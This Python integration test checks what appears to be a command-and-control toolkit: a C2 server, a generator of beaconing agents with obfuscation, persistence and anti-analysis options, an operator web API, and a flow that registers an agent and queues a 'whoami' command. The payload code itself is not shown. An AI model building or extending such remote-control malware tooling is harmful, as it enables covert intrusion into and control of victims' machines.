#!/usr/bin/env python3
"""
Full System Integration Test
Tests all components working together
"""

import sys
import os
import time
import threading
import subprocess
import socket
import json

sys.path.insert(0, '/workspace')

from Core.config_loader import config
from Core.logger import get_logger
from Core.database import db
from Core.c2_server import SecureC2Server
from Core.payload_generator import AdvancedPayloadGenerator
from Core.web_api import create_app

log = get_logger('test')

def test_full_system():
    """Test complete system integration"""
    
    print("="*70)
    print("FULL SYSTEM INTEGRATION TEST")
    print("="*70)
    
    results = []
    
    # Test 1: Database
    print("\n[1] Testing Database...")
    try:
        stats = db.get_statistics()
        print(f"✅ Database operational: {len(stats)} stats available")
        results.append(('Database', True))
    except Exception as e:
        print(f"❌ Database failed: {e}")
        results.append(('Database', False))
    
    # Test 2: C2 Server
    print("\n[2] Testing C2 Server...")
    try:
        c2 = SecureC2Server()
        
        # Start in thread
        c2_thread = threading.Thread(target=c2.start)
        c2_thread.daemon = True
        c2_thread.start()
        
        time.sleep(2)
        
        if c2.running:
            print(f"✅ C2 Server running on {c2.host}:{c2.port}")
            
            # Test connection
            try:
                sock = socket.socket()
                sock.settimeout(2)
                sock.connect((c2.host, c2.port))
                sock.close()
                print("✅ C2 Server accepting connections")
                results.append(('C2 Server', True))
            except:
                print("❌ C2 Server not accepting connections")
                results.append(('C2 Server', False))
                
            c2.stop()
        else:
            print("❌ C2 Server failed to start")
            results.append(('C2 Server', False))
            
    except Exception as e:
        print(f"❌ C2 Server error: {e}")
        results.append(('C2 Server', False))
    
    # Test 3: Payload Generator
    print("\n[3] Testing Payload Generator...")
    try:
        gen = AdvancedPayloadGenerator()
        gen.obfuscation_level = 0  # No obfuscation for testing
        
        code = gen.generate_agent(
            platform='python',
            persistence=False,
            anti_analysis=False
        )
        
        # Verify it compiles
        compile(code, '<string>', 'exec')
        
        # Check critical components
        has_c2 = 'C2Protocol' in code
        has_beacon = 'beacon' in code
        has_exec = 'execute_command' in code
        
        if has_c2 and has_beacon and has_exec:
            print(f"✅ Payload generator works: {len(code)} bytes")
            print(f"   - Has C2 Protocol: {has_c2}")
            print(f"   - Has beacon: {has_beacon}")
            print(f"   - Can execute: {has_exec}")
            results.append(('Payload Generator', True))
        else:
            print("❌ Payload missing critical components")
            results.append(('Payload Generator', False))
            
    except Exception as e:
        print(f"❌ Payload generator error: {e}")
        results.append(('Payload Generator', False))
    
    # Test 4: Web API
    print("\n[4] Testing Web API...")
    try:
        app = create_app()
        
        with app.test_client() as client:
            # Test health
            r = client.get('/health')
            if r.status_code == 200:
                print("✅ Web API health check passed")
                
                # Test login
                r = client.post('/api/auth/login',
                              json={'username': 'admin',
                                   'password': config.get('webapp.admin_password')})
                
                if r.status_code == 200:
                    token = r.json['token']
                    print("✅ Authentication working")
                    
                    # Test authenticated endpoint
                    headers = {'Authorization': f'Bearer {token}'}
                    r = client.get('/api/agents', headers=headers)
                    
                    if r.status_code == 200:
                        print(f"✅ API endpoints working: {r.json['total']} agents")
                        results.append(('Web API', True))
                    else:
                        print("❌ API endpoints not working")
                        results.append(('Web API', False))
                else:
                    print("❌ Authentication failed")
                    results.append(('Web API', False))
            else:
                print("❌ Health check failed")
                results.append(('Web API', False))
                
    except Exception as e:
        print(f"❌ Web API error: {e}")
        results.append(('Web API', False))
    
    # Test 5: Web UI
    print("\n[5] Testing Web UI...")
    try:
        ui_path = '/workspace/web/index.html'
        if os.path.exists(ui_path):
            with open(ui_path, 'r') as f:
                content = f.read()
                
            # Check for critical elements
            has_login = 'loginForm' in content
            has_dashboard = 'dashboard' in content
            has_terminal = 'terminal' in content
            has_agents = 'agentList' in content
            
            if all([has_login, has_dashboard, has_terminal, has_agents]):
                print(f"✅ Web UI complete: {len(content)} bytes")
                print(f"   - Login form: {has_login}")
                print(f"   - Dashboard: {has_dashboard}")
                print(f"   - Terminal: {has_terminal}")
                print(f"   - Agent list: {has_agents}")
                results.append(('Web UI', True))
            else:
                print("❌ Web UI missing components")
                results.append(('Web UI', False))
        else:
            print("❌ Web UI not found")
            results.append(('Web UI', False))
            
    except Exception as e:
        print(f"❌ Web UI error: {e}")
        results.append(('Web UI', False))
    
    # Test 6: End-to-End Flow
    print("\n[6] Testing End-to-End Flow...")
    try:
        # This tests the conceptual flow
        # 1. Generate payload
        gen = AdvancedPayloadGenerator()
        gen.obfuscation_level = 0
        payload = gen.generate_agent(platform='python', persistence=False, anti_analysis=False)
        
        # 2. Save payload
        filepath = gen.save_payload(payload, 'e2e_test.py')
        
        # 3. Verify payload exists
        if os.path.exists(filepath):
            print("✅ Payload generated and saved")
            
            # 4. Check if it would connect to C2
            if str(config.c2_port) in payload:
                print("✅ Payload configured for C2")
                
                # 5. Simulate agent registration
                test_agent = {
                    'hostname': 'TEST-E2E',
                    'username': 'testuser',
                    'platform': 'Test',
                    'ip_address': '127.0.0.1'
                }
                
                if db.add_agent(test_agent):
                    print("✅ Agent registration works")
                    
                    # 6. Get agents
                    agents = db.get_all_agents()
                    if any(a['hostname'] == 'TEST-E2E' for a in agents):
                        print("✅ Agent appears in database")
                        
                        # 7. Queue command
                        agent_id = next(a['id'] for a in agents if a['hostname'] == 'TEST-E2E')
                        cmd_id = db.add_command(agent_id, 'whoami')
                        
                        if cmd_id:
                            print("✅ Command queuing works")
                            
                            # 8. Add fake result
                            db.add_result(cmd_id, agent_id, 'test\\user', execution_time=0.1)
                            
                            # 9. Get results
                            results_list = db.get_command_results(agent_id, limit=1)
                            if results_list and results_list[0]['output'] == 'test\\user':
                                print("✅ Result storage and retrieval works")
                                print("✅ END-TO-END FLOW COMPLETE")
                                results.append(('End-to-End', True))
                            else:
                                print("❌ Result retrieval failed")
                                results.append(('End-to-End', False))
                        else:
                            print("❌ Command queuing failed")
                            results.append(('End-to-End', False))
                    else:
                        print("❌ Agent not in database")
                        results.append(('End-to-End', False))
                else:
                    print("❌ Agent registration failed")
                    results.append(('End-to-End', False))
            else:
                print("❌ Payload not configured correctly")
                results.append(('End-to-End', False))
        else:
            print("❌ Payload not saved")
            results.append(('End-to-End', False))
            
    except Exception as e:
        print(f"❌ End-to-end error: {e}")
        results.append(('End-to-End', False))
    
    # Final Report
    print("\n" + "="*70)
    print("TEST RESULTS")
    print("="*70)
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for component, result in results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"{component:.<30} {status}")
    
    score = (passed / total) * 100
    print(f"\nScore: {passed}/{total} ({score:.0f}%)")
    
    if score == 100:
        print("\n🎉 SYSTEM FULLY OPERATIONAL!")
        print("All components tested and working correctly.")
    elif score >= 80:
        print("\n✅ SYSTEM MOSTLY OPERATIONAL")
        print("Most components working, some issues remain.")
    elif score >= 60:
        print("\n⚠️ SYSTEM PARTIALLY OPERATIONAL")
        print("Significant components working but needs fixes.")
    else:
        print("\n❌ SYSTEM NOT OPERATIONAL")
        print("Major issues preventing operation.")
    
    return score

if __name__ == "__main__":
    score = test_full_system()
    sys.exit(0 if score >= 80 else 1)